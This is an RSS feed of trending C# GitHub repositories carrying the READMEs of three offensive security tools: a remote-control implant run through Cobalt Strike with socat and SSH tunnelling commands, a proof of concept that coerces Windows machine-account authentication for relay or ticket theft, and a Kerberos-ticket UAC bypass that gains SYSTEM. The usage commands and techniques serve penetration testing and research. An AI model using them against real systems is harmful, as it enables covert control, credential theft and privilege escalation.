<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub C# Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2023-07-30T01:32:31Z</updated>
  <subtitle>Daily Trending of C# in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>ps1337/reinschauer</title>
    <updated>2023-07-30T01:32:31Z</updated>
    <id>tag:github.com,2023-07-30:/ps1337/reinschauer</id>
    <link href="https://github.com/ps1337/reinschauer" rel="alternate"></link>
    <summary type="html">&lt;p&gt;it is very good&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Reinschauer&lt;/h1&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/ps1337/reinschauer/raw/main/server/reinschauer.jpg?raw=true&#34; alt=&#34;Hello&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;A PoC to remotely control Windows machines over Websockets. Check out &lt;a href=&#34;https://bananamafia.dev/post/reinschauer/&#34;&gt;my blog&lt;/a&gt; for a writeup.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/ps1337/reinschauer/raw/main/res/reinschauer.gif?raw=true&#34; alt=&#34;Hello&#34;&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Can be executed as Go exe, .NET/C# exe and in-memory using &lt;a href=&#34;https://github.com/CCob/BOF.NET&#34;&gt;BOF.NET&lt;/a&gt; and Cobaltstrike.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/ps1337/reinschauer/raw/main/res/reinschauer_start.png?raw=true&#34; alt=&#34;Hello&#34;&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Traffic can be tunneled via an interactive Beacon connection.&lt;/li&gt; &#xA; &lt;li&gt;Other than most HVNC implementations, &lt;code&gt;reinschauer&lt;/code&gt; converts raw bitmaps to JPEG and compresses the resulting data before sending it across the network to reduce frame size.&lt;/li&gt; &#xA; &lt;li&gt;FPS and quality settings can be dynamically changed via the GUI. These affect the implant, so that network traffic is reduced. Dynamic scaling allows using this tool as an implant for machines with large screens.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/ps1337/reinschauer/raw/main/res/goodquality.gif?raw=true&#34; alt=&#34;Hello&#34;&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Basic mouse and keyboard controls are possible.&lt;/li&gt; &#xA; &lt;li&gt;You can use the script in the &lt;code&gt;server&lt;/code&gt; folder to generate TLS server files or bring your own.&lt;/li&gt; &#xA; &lt;li&gt;The server window can be resized freely, while click events should™ be translated to the correct pixel on the target machine.&lt;/li&gt; &#xA; &lt;li&gt;Use &lt;code&gt;reinschauer-server -h&lt;/code&gt; for available options.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Protocol&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt;+----------------------------------------------------------------------------------------+&#xA;|                                                                                        |&#xA;|                                                                                        |&#xA;|                  +----------------------------------------------------+                |&#xA;|                  |#1: Type (Binary or Text)                           |                |&#xA;|                  |    Binary: JPG Frame                               |                |&#xA;|                  |                                                    |                |&#xA;|                  |#2: Text                                            |                |&#xA;|                  |    ELO (Ping)                                      |                |&#xA;|                  |    FPS &amp;lt;FPS Count&amp;gt;                                 |                |&#xA;|                  |    SCL &amp;lt;Scaler Count&amp;gt;                              |                |&#xA;|                  |    QUL &amp;lt;JPG Quality&amp;gt;                               |                |&#xA;|                  |    LCL X Y (Left Click + Coordinates)              |                |&#xA;|                  |    RCL X Y                                         |                |&#xA;|                  |    KEY &amp;lt;Char&amp;gt;                                      |      xxxxxx    |&#xA;|       xxxxx   &amp;lt;--+----------------------------------------------------+--&amp;gt; xxxx   xx   |&#xA;|       x   xx                     Websockets via TLS                        xx       x  |&#xA;| x     xxxxxx                                                                xxxxxxxxx  |&#xA;| xxx     x   xx                                                          xx    x        |&#xA;|     xxxxxxxx                                                              xxxxx xxxxxx |&#xA;|         x                                                                   xxxxx      |&#xA;|         xx                                                                   xx        |&#xA;|         x xx                                                                 xxx       |&#xA;|        xx  xx                                                                x xx      |&#xA;|        x    xx                                                              xx  xxx    |&#xA;|       x      xx                                                             x     xx   |&#xA;|       x       x                                                            xx      x   |&#xA;+----------------------------------------------------------------------------------------+&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;FAQ&lt;/h2&gt; &#xA;&lt;p&gt;&lt;strong&gt;How to build?&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Install a new version of golang, &lt;code&gt;&amp;gt;=1.18&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;For debian-based distros: &lt;code&gt;sudo apt -y install libx11-dev libxcursor-dev xorg-dev libgl1-mesa-dev&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ cd client &amp;amp;&amp;amp; GOOS=windows GOARCH=amd64 go build&#xA;$ cd server &amp;amp;&amp;amp; GOOS=linux GOARCH=amd64 go build&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;I&#39;ve included a pre-built and standalone version of the dotnet variant in this repo. If you want to build it yourself, use the Visual Studio project file to build the x64 Release variant. If it doesn&#39;t happen automatically, download the required NuGet packages for the project via Visual Studio. Your target system most likely doesn&#39;t have these packages installed as well and therefore DLLs may be missing when executing the resulting exe on the target. To get around this, this project automatically invokes &lt;code&gt;ILMerge.exe&lt;/code&gt; to bundle the resulting exe along with the required libraries. Therefore, use the generated file called &lt;code&gt;reinschauer-dotnet-standalone.exe&lt;/code&gt; on targets.&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;You may have to &lt;code&gt;go get&lt;/code&gt; stuff before. Use &lt;code&gt;-ldflags -H=windowsgui&lt;/code&gt; to disable to console window.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;&lt;strong&gt;Who&#39;s the client/server?&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;The &lt;code&gt;client&lt;/code&gt; is executed on the target (Windows) machine. The &lt;code&gt;server&lt;/code&gt; component is executed on the tester&#39;s (Linux) machine. It listens on &lt;code&gt;0.0.0.0:6969&lt;/code&gt; by default. Both the Golang and C# client are compatible with the server.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;&lt;strong&gt;Is this a HVNC / Hidden Desktop?&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;No. It uses the same Desktop as the user.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;&lt;strong&gt;Some keys and key combinations do not work, pls fix&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;I know that |, @ and § might not work currently, at least on my german potato keyboard. Pls Fix.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;&lt;strong&gt;The Client uses too much CPU Time&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Using a lower FPS value may work.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;&lt;strong&gt;I don&#39;t have a direct connection between &lt;code&gt;client&lt;/code&gt; and &lt;code&gt;server&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;You can use a CobaltStrike Beacon to tunnel traffic.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;&lt;strong&gt;I don&#39;t have Cobaltstrike!&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Use a &lt;code&gt;socat&lt;/code&gt; redirector like:&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;socat TCP4-LISTEN:1337,fork TCP4:127.0.0.1:6969&#xA;ssh -R 6969:localhost6969 &amp;lt;IP&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;and start the client with the required parameters or hardcode them.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h2&gt;Notes Regarding BOF.NET and Cobaltstrike Usage&lt;/h2&gt; &#xA;&lt;p&gt;First, set up &lt;a href=&#34;https://github.com/CCob/BOF.NET&#34;&gt;BOF.NET&lt;/a&gt; according to the manual. Also, load the standalone exe with &lt;code&gt;bofnet_load &amp;lt;Path to Exe&amp;gt;&lt;/code&gt;. Then, decide how to use Reinschauer:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;You can tunnel the traffic across an active Beacon connection.&lt;/li&gt; &#xA; &lt;li&gt;You can send traffic to any other Internet-facing server&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h3&gt;Tunnelling Traffic via Beacon&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Set the session to interactive: &lt;code&gt;sleep 0&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;Set up remote port forwarding: &lt;code&gt;rportfwd_local 6969 127.0.0.1 6969&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;Execute Reinschauer in background: &lt;code&gt;bofnet_job reinschauer_dotnet.BofStuff&lt;/code&gt;. This automatically causes Reinschauer to connect to &lt;code&gt;127.0.0.1:6969&lt;/code&gt; on &lt;code&gt;127.0.0.1&lt;/code&gt; of the target machine. This also deactivates TLS, since it uses the Beacon connection anyway.&lt;/li&gt; &#xA; &lt;li&gt;To kill Reinschauer, use &lt;code&gt;bofnet_jobkill &amp;lt;Job ID&amp;gt;&lt;/code&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Sending Traffic to Another Server&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Execute Reinschauer in background: &lt;code&gt;bofnet_job reinschauer_dotnet.BofStuff &amp;lt;Server IP&amp;gt; &amp;lt;Server Port&amp;gt; true&lt;/code&gt;. The boolean parameter enables TLS usage.&lt;/li&gt; &#xA; &lt;li&gt;To kill Reinschauer, use &lt;code&gt;bofnet_jobkill &amp;lt;Job ID&amp;gt;&lt;/code&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Then, use SSH and the &lt;a href=&#34;https://man.openbsd.org/sshd_config#GatewayPorts&#34;&gt;GatewayPorts&lt;/a&gt; feature: Add &lt;code&gt;GatewayPorts: clientspecified&lt;/code&gt; to &lt;code&gt;sshd_config&lt;/code&gt; and restart the SSH server. Then, &lt;code&gt;ssh -R &#39;0.0.0.0:8080:localhost:6969&#39;&#39; [...]&lt;/code&gt; will make your local port &lt;code&gt;6969&lt;/code&gt; available on &lt;code&gt;0.0.0.0:8080&lt;/code&gt;. Be careful :)&lt;/p&gt; &#xA;&lt;p&gt;Or, set up a &lt;code&gt;socat&lt;/code&gt; redirector on the Server:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;socat TCP4-LISTEN:&amp;lt;Server Port&amp;gt;,fork TCP4:127.0.0.1:6969&#xA;ssh -R 6969:localhost6969 &amp;lt;IP&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt;</summary>
  </entry>
  <entry>
    <title>slemire/WSPCoerce</title>
    <updated>2023-07-30T01:32:31Z</updated>
    <id>tag:github.com,2023-07-30:/slemire/WSPCoerce</id>
    <link href="https://github.com/slemire/WSPCoerce" rel="alternate"></link>
    <summary type="html">&lt;p&gt;PoC to coerce authentication from Windows hosts using MS-WSP&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;WSPCoerce&lt;/h1&gt; &#xA;&lt;p&gt;PoC to coerce authentication from Windows hosts using MS-WSP&lt;/p&gt; &#xA;&lt;h2&gt;What is this?&lt;/h2&gt; &#xA;&lt;p&gt;It&#39;s a tool to interact with remote hosts using the Windows Search Protocol and coerce authentication. The target host will connect over SMB to the listener host using the machine account.&lt;/p&gt; &#xA;&lt;h2&gt;What can I do with this?&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Relay the authentication from the target to another system (if SMB signing is disabled)&lt;/li&gt; &#xA; &lt;li&gt;Obtain the TGT of the target (if coercing to a system where unconstrained delegation is enabled)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;What are the requirements?&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Must be running in the context of a domain user (no specific privileges required on target system AFAIK)&lt;/li&gt; &#xA; &lt;li&gt;445/TCP open on the target system&lt;/li&gt; &#xA; &lt;li&gt;445/TCP open on the listener system&lt;/li&gt; &#xA; &lt;li&gt;Windows Search Service running on the target system&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Note: The Windows Search Service is &lt;em&gt;NOT&lt;/em&gt; enabled by default on Windows Server so in practice this attack is only effective against Windows workstations.&lt;/p&gt; &#xA;&lt;h2&gt;How do I compile this?&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt;c:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe WSPCoerce.cs&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;How do I run this?&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt;WSPCoerce.exe &amp;lt;target&amp;gt; &amp;lt;listener&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Notes:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Can&#39;t use an IP address for the target&lt;/li&gt; &#xA; &lt;li&gt;Make sure to use a hostname or FQDN for the listener if you want to receive Kerberos auth&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Example demo 1 - Machine account NTLMv2 capture&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Target: LABWS1&lt;/li&gt; &#xA; &lt;li&gt;Listener: Kali box&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Search request sent to LABWS1:&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/slemire/WSPCoerce/main/demo/wsp_2.PNG&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;NTLMv2 captured on Responder:&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/slemire/WSPCoerce/main/demo/wsp_labws1_ntlmv2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Example demo 2 - Coercion to unconstrained delegation&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Target: LABWS1&lt;/li&gt; &#xA; &lt;li&gt;Listener: LABSRV1&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Search request sent to LABWS1:&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/slemire/WSPCoerce/main/demo/wsp_1.PNG&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;Kerberos TGT on listener (LABSRV1):&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/slemire/WSPCoerce/main/demo/wsp_tgt_1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>wh0amitz/KRBUACBypass</title>
    <updated>2023-07-30T01:32:31Z</updated>
    <id>tag:github.com,2023-07-30:/wh0amitz/KRBUACBypass</id>
    <link href="https://github.com/wh0amitz/KRBUACBypass" rel="alternate"></link>
    <summary type="html">&lt;p&gt;UAC Bypass By Abusing Kerberos Tickets&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Background&lt;/h2&gt; &#xA;&lt;p&gt;This POC is inspired by James Forshaw (&lt;a href=&#34;https://twitter.com/tiraniddo&#34;&gt;@tiraniddo&lt;/a&gt;) shared at BlackHat USA 2022 titled “&lt;a href=&#34;https://i.blackhat.com/USA-22/Wednesday/US-22-Forshaw-Taking-Kerberos-To-The-Next-Level.pdf&#34;&gt;&lt;em&gt;Taking Kerberos To The Next Level&lt;/em&gt;&lt;/a&gt; ” topic, he shared a Demo of abusing Kerberos tickets to achieve UAC bypass. By adding a &lt;code&gt;KERB-AD-RESTRICTION-ENTRY&lt;/code&gt; to the service ticket, but filling in a fake MachineID, we can easily bypass UAC and gain SYSTEM privileges by accessing the SCM to create a system service. James Forshaw explained the rationale behind this in a blog post called &#34;&lt;a href=&#34;https://www.tiraniddo.dev/2022/03/bypassing-uac-in-most-complex-way.html&#34;&gt;&lt;em&gt;Bypassing UAC in the most Complex Way Possible!&lt;/em&gt;&lt;/a&gt;&#34;, which got me very interested. Although he didn&#39;t provide the full exploit code, I built a POC based on &lt;a href=&#34;https://github.com/GhostPack/Rubeus#tgtdeleg&#34;&gt;Rubeus&lt;/a&gt;. As a C# toolset for raw Kerberos interaction and ticket abuse, Rubeus provides an easy interface that allows us to easily initiate Kerberos requests and manipulate Kerberos tickets.&lt;/p&gt; &#xA;&lt;h3&gt;Tgtdeleg Trick&lt;/h3&gt; &#xA;&lt;p&gt;We cannot manually generate a TGT as we do not have and do not have access to the current user&#39;s credentials. However, Benjamin Delpy (&lt;a href=&#34;https://github.com/gentilkiwi&#34;&gt;@gentilkiwi&lt;/a&gt;) in his &lt;a href=&#34;https://github.com/gentilkiwi/kekeo/raw/4fbb44ec54ff093ae0fbe4471de19681a8e71a86/kekeo/modules/kuhl_m_tgt.c#L189&#34;&gt;Kekeo&lt;/a&gt; A trick (tgtdeleg) was added that allows you to abuse unconstrained delegation to obtain a local TGT with a session key.&lt;/p&gt; &#xA;&lt;p&gt;Tgtdeleg abuses the Kerberos GSS-API to obtain available TGTs for the current user without obtaining elevated privileges on the host. This method uses the &lt;code&gt;AcquireCredentialsHandle&lt;/code&gt; function to obtain the Kerberos security credentials handle for the current user, and calls the &lt;code&gt;InitializeSecurityContext&lt;/code&gt; function for &lt;code&gt;HOST/DC.domain.com&lt;/code&gt; using the &lt;code&gt;ISC_REQ_DELEGATE&lt;/code&gt; flag and the target SPN to prepare the pseudo-delegation context to send to the domain controller. This causes the KRB_AP-REQ in the GSS-API output to include the KRB_CRED in the Authenticator Checksum. The service ticket&#39;s session key is then extracted from the local Kerberos cache and used to decrypt the KRB_CRED in the Authenticator to obtain a usable TGT. The Rubeus toolset also incorporates this technique. For details, please refer to “&lt;a href=&#34;https://blog.harmj0y.net/redteaming/rubeus-now-with-more-kekeo/#tgtdeleg&#34;&gt;&lt;em&gt;Rubeus – Now With More Kekeo&lt;/em&gt;&lt;/a&gt;”.&lt;/p&gt; &#xA;&lt;p&gt;With this TGT, we can generate our own service ticket, and the feasible operation process is as follows:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Use the Tgtdeleg trick to get the user&#39;s TGT.&lt;/li&gt; &#xA; &lt;li&gt;Use the TGT to request the KDC to generate a new service ticket for the local computer. Add a &lt;code&gt;KERB-AD-RESTRICTION-ENTRY&lt;/code&gt;, but fill in a fake MachineID.&lt;/li&gt; &#xA; &lt;li&gt;Submit the service ticket into the cache.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h2&gt;Krbscm&lt;/h2&gt; &#xA;&lt;p&gt;Once you have a service ticket, you can use Kerberos authentication to access Service Control Manager (SCM) Named Pipes or TCP via HOST/HOSTNAME or RPC/HOSTNAME SPN. Note that SCM&#39;s Win32 API always uses Negotiate authentication. James Forshaw created a simple POC: &lt;a href=&#34;https://gist.github.com/tyranid/c24cfd1bd141d14d4925043ee7e03c82&#34;&gt;SCMUACBypass.cpp&lt;/a&gt;, through the two APIs HOOK AcquireCredentialsHandle and InitializeSecurityContextW, the name of the authentication package called by SCM (pszPack age ) to Kerberos to enable the SCM to use Kerberos when authenticating locally.&lt;/p&gt; &#xA;&lt;h2&gt;Let’s see it in action&lt;/h2&gt; &#xA;&lt;p&gt;Now let&#39;s take a look at the running effect, as shown in the figure below. First request a ticket for the HOST service of the current server through the asktgs function, and then create a system service through krbscm to gain the SYSTEM privilege.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-console&#34;&gt;KRBUACBypass.exe asktgs&#xA;KRBUACBypass.exe krbscm&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/wh0amitz/KRBUACBypass/master/images/Animation.gif&#34; alt=&#34;Animation&#34;&gt;&lt;/p&gt;</summary>
  </entry>
</feed>